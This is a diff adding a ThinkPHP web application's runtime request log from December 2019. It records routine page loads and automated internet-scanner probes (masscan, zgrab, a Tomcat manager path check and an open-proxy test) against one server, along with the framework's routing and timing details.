+  'referer' => 'http://114.115.146.220:80/index.php',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => '114.115.146.220',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000627s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000252s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000208s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T15:30:12+08:00 ] 206.189.37.55 GET /
+[运行时间：0.035562s] [吞吐率：28.12req/s] [内存消耗：471.55kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000094s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001055s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001090s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)',
+  'accept' => '*/*',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001488s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000338s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000224s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T15:39:30+08:00 ] 111.119.48.149 GET 114.115.146.220:80/
+[运行时间：0.026289s] [吞吐率：38.04req/s] [内存消耗：472.14kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000060s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001175s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001209s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000919s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000389s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000241s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T16:12:38+08:00 ] 60.191.66.222 GET 114.115.146.220:80/manager/html
+[运行时间：0.018979s] [吞吐率：52.69req/s] [内存消耗：333.27kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001030s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001065s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'manager',
+    1 => 'html',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, application/xhtml+xml, */*',
+  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
+  'host' => '114.115.146.220:80',
+  'authorization' => 'Basic Og==',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000213s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T16:17:24+08:00 ] 83.97.20.49 GET /
+[运行时间：0.024030s] [吞吐率：41.61req/s] [内存消耗：470.84kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001041s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001074s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000858s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000325s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000231s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T16:39:36+08:00 ] 31.192.140.185 GET 114.115.146.220:80/
+[运行时间：0.024008s] [吞吐率：41.65req/s] [内存消耗：472.14kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001040s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001074s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000838s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000335s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T17:17:12+08:00 ] 190.130.2.230 GET 114.115.146.220:80/
+[运行时间：0.048548s] [吞吐率：20.60req/s] [内存消耗：472.14kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000211s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001639s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001694s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001946s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000697s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000235s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T17:17:12+08:00 ] 190.130.2.230 GET 114.115.146.220:80/
+[运行时间：0.045531s] [吞吐率：21.96req/s] [内存消耗：472.14kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000098s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001748s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001804s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001977s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000707s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000378s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T18:45:30+08:00 ] 80.82.77.33 GET 114.115.146.220/
+[运行时间：0.025541s] [吞吐率：39.15req/s] [内存消耗：472.42kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000072s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001106s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001140s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => '114.115.146.220',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001215s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000327s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000225s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T18:45:31+08:00 ] 80.82.77.33 GET 114.115.146.220/sitemap.xml
+[运行时间：0.010594s] [吞吐率：94.39req/s] [内存消耗：332.46kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000055s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000695s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000728s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sitemap.xml',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'accept-encoding' => 'identity',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000211s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T18:45:32+08:00 ] 80.82.77.33 GET 114.115.146.220/.well-known/security.txt
+[运行时间：0.010839s] [吞吐率：92.26req/s] [内存消耗：332.57kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000068s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000945s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000978s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.well-known',
+    1 => 'security.txt',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'accept-encoding' => 'identity',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000214s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T18:45:32+08:00 ] 80.82.77.33 GET 114.115.146.220/favicon.ico
+[运行时间：0.010397s] [吞吐率：96.18req/s] [内存消耗：333.02kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000702s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000735s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.13.0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000216s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T19:00:12+08:00 ] 185.234.217.182 GET 114.115.146.220:80/
+[运行时间：0.025269s] [吞吐率：39.57req/s] [内存消耗：472.33kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001057s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001091s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000863s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000382s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000227s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T19:17:25+08:00 ] 80.82.70.187 GET www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif
+[运行时间：0.019057s] [吞吐率：52.47req/s] [内存消耗：332.79kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000060s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001037s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001071s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cache',
+    1 => 'global',
+    2 => 'img',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.baidu.com',
+  'user-agent' => 'Mozilla',
+  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000214s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T19:34:43+08:00 ] 157.119.227.110 GET 114.115.146.220:80/
+[运行时间：0.024388s] [吞吐率：41.00req/s] [内存消耗：472.14kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001143s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001201s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000865s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000328s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000230s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T19:45:33+08:00 ] 159.203.201.126 GET 114.115.146.220/
+[运行时间：0.023789s] [吞吐率：42.04req/s] [内存消耗：471.96kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001029s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001063s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000839s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000327s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000219s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T19:54:42+08:00 ] 191.97.41.166 GET 114.115.146.220:80/
+[运行时间：0.027938s] [吞吐率：35.79req/s] [内存消耗：472.14kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000060s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001016s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001049s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000849s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000333s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000219s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T19:57:26+08:00 ] 5.189.134.236 GET /
+[运行时间：0.024216s] [吞吐率：41.30req/s] [内存消耗：471.55kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001038s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001072s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)',
+  'accept' => '*/*',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000856s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000328s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000223s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T21:05:27+08:00 ] 139.162.106.181 GET 114.115.146.220/
+[运行时间：0.024395s] [吞吐率：40.99req/s] [内存消耗：471.93kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000062s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001029s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001063s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'HTTP Banner Detection (https://security.ipip.net)',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000851s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000324s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000222s ]
+[ info ] [ LOG ] INIT File
